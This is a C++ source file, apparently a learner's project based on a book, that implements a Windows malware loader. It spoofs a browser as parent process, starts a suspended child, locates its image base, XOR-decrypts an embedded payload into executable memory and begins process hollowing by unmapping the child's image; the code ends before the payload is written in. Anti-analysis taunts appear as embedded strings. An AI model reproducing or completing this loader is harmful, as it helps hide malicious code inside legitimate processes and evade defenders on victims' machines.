/* 1. Rename conflicting structs AND their pointer types to fix conflicting with windows APIs or that's what AI told me */
#define _FILE_STAT_INFORMATION           _SDK_FILE_STAT_INFORMATION
#define _FILE_STAT_LX_INFORMATION        _SDK_FILE_STAT_LX_INFORMATION
#define _FILE_CASE_SENSITIVE_INFORMATION _SDK_FILE_CASE_SENSITIVE_INFORMATION

#define FILE_STAT_INFORMATION            SDK_FILE_STAT_INFORMATION
#define FILE_STAT_LX_INFORMATION         SDK_FILE_STAT_LX_INFORMATION
#define FILE_CASE_SENSITIVE_INFORMATION  SDK_FILE_CASE_SENSITIVE_INFORMATION

#define PFILE_STAT_INFORMATION           SDK_PFILE_STAT_INFORMATION
#define PFILE_STAT_LX_INFORMATION        SDK_PFILE_STAT_LX_INFORMATION
#define PFILE_CASE_SENSITIVE_INFORMATION SDK_PFILE_CASE_SENSITIVE_INFORMATION

#include <phnt_windows.h>

#undef _FILE_STAT_INFORMATION
#undef _FILE_STAT_LX_INFORMATION
#undef _FILE_CASE_SENSITIVE_INFORMATION

#undef FILE_STAT_INFORMATION
#undef FILE_STAT_LX_INFORMATION
#undef FILE_CASE_SENSITIVE_INFORMATION
#undef PFILE_STAT_INFORMATION
#undef PFILE_STAT_LX_INFORMATION
#undef PFILE_CASE_SENSITIVE_INFORMATION
#include <phnt.h>

#include<stdio.h>
#include<tlhelp32.h>
#include <stdint.h>

#ifdef _WIN64
#pragma message("Compiling as x64")
#else
#pragma message("Compiling as x86")
#endif

/*
// might need later
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (__stdcall *NT_OPEN_FILE)(OUT PHANDLE
FileHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES
ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG
ShareAccess, IN ULONG OpenOptions);

extern "C" void __stdcall RtlGetVersion(OSVERSIONINFO*);
*/
bool CheckIfBrowser(wchar_t* processName) {
      bool res = false;
      const wchar_t* browsers[] = {
            L"chrome.exe",
            L"msedge.exe",
            L"firefox.exe",
            L"opera.exe"
      };
      for(const wchar_t* browser : browsers) {
            if(wcscmp(browser, processName) == 0) res = true;
      }

      return res;
}

void test_phnt(void) {
      PROCESS_BASIC_INFORMATION pbi = { sizeof(PROCESS_BASIC_INFORMATION) };
      ULONG returnLength = 0; 

      NTSTATUS status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &returnLength
      );

      if(!NT_SUCCESS(status)) printf("[*] IT DIDN'T WORK CALL THE AMBULANCE: 0x%08X\n", status);
      else printf("[*] CALL THE AMBULANCE BUT NOT FOR ME: %p\n", pbi.PebBaseAddress);
}

int main() {
      WCHAR stop[] = L"Stop reversing the binary";
      WCHAR reconsider[] = L"Reconsider your life choices";
      WCHAR touch[] = L"And go touch some grass";
      WCHAR yorushiku[] = L"よろしくお願いします";

      // Creates a snapshot of processes
      HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      if(hSnapshot == INVALID_HANDLE_VALUE) {
            printf("[*] Failed to enumerate process");
      }

      PROCESSENTRY32 currentProcess = { sizeof(PROCESSENTRY32) };

      // Process32First(snapshot, [out] processStructure) -> PROCESSENTRY32

      printf("\t[Process name] \t[PID]\t[PPID] \n");
      
      if(!Process32First(hSnapshot, &currentProcess)) {
            printf("[*] Failed to read snapshot");
            CloseHandle(hSnapshot);
      }

      do {
      if(CheckIfBrowser(currentProcess.szExeFile)) {
            printf("%25S %8d %8d \n",
                        currentProcess.szExeFile, currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
            break;
       }
      } while(Process32Next(hSnapshot, &currentProcess));

      // OpenProcess to obtain a handle for NTCreateProcessEx
      HANDLE hParentProcess = OpenProcess(
        MAXIMUM_ALLOWED,
        FALSE,                                     
        currentProcess.th32ProcessID                                  
    );

      WCHAR cmdLine[MAX_PATH];
      DWORD size = MAX_PATH;
      QueryFullProcessImageNameW(hParentProcess, 0, cmdLine, &size);
      printf("[*] Obtained full path %S:\n", cmdLine);
 

    if(hParentProcess != NULL && hParentProcess != INVALID_HANDLE_VALUE) printf("[+] Obtained parent process \n");
     
     // Let's try the basic method of PPID
      STARTUPINFOEXW si = {};
      PROCESS_INFORMATION pi = {};
      SIZE_T attributeSize;
      ZeroMemory(&si, sizeof(STARTUPINFOEXW));

      InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
      si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);

      /*
       * BOOL InitializeProcThreadAttributeList(
       *    [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
       *    [in]            DWORD                        dwAttributeCount,
       *                    DWORD                        dwFlags,
       *    [in, out]       PSIZE_T                      lpSize
       * );
       */
      InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
      /*
      * BOOL UpdateProcThreadAttribute(
      *     [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
      *     [in]            DWORD                        dwFlags,
      *     [in]            DWORD_PTR                    Attribute, --
      *     [in]            PVOID                        lpValue, 
      *     [in]            SIZE_T                       cbSize,
      *     [out, optional] PVOID                        lpPreviousValue,
      *     [in, optional]  PSIZE_T                      lpReturnSize
      * );
      */
      UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
      si.StartupInfo.cb = sizeof(si);
      
      CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi);
      printf("[+] Child process created successfully: %8d\n", pi.dwProcessId); 
      
      HANDLE hChildProcess = pi.hProcess;       
      LPCONTEXT context = new CONTEXT();
      context->ContextFlags = CONTEXT_ALL;
      GetThreadContext(pi.hThread, context);
      
      // The book used Ebx which applies to x86 processes but since most systems are now x64 I defaulted to Rdx.
      // https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_PEB
      LPVOID pebImageBaseOffset = (PBYTE)context->Rdx + 0x10;
      LPVOID destImageBase = 0;
      SIZE_T bytesRead = NULL;
      ReadProcessMemory(
            hChildProcess, 
            pebImageBaseOffset, 
            &destImageBase, 
            sizeof(pebImageBaseOffset), 
            &bytesRead);
      printf("ImageBase: %p\n", destImageBase);
      
      // decrypting the resource
      HRSRC hResource = FindResourceW(NULL, L"MAIN", L"CONFIG");
      HGLOBAL resourceData = LoadResource(NULL, hResource);
      DWORD resourceSize = SizeofResource(NULL, hResource);
      void* exec = VirtualAlloc(NULL, resourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      memcpy(exec, resourceData, resourceSize);
      uint8_t key = 0xCC;
      for(size_t i = 0; i < resourceSize; ++i) {
            ((uint8_t*)exec)[i] ^= key;
      }

      PIMAGE_DOS_HEADER payloadDosHeader = (PIMAGE_DOS_HEADER)exec;
      PIMAGE_NT_HEADERS payloadImageNTHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)exec + payloadDosHeader->e_lfanew);

      NtUnmapViewOfSection(hChildProcess, destImageBase);

      return 0;
}
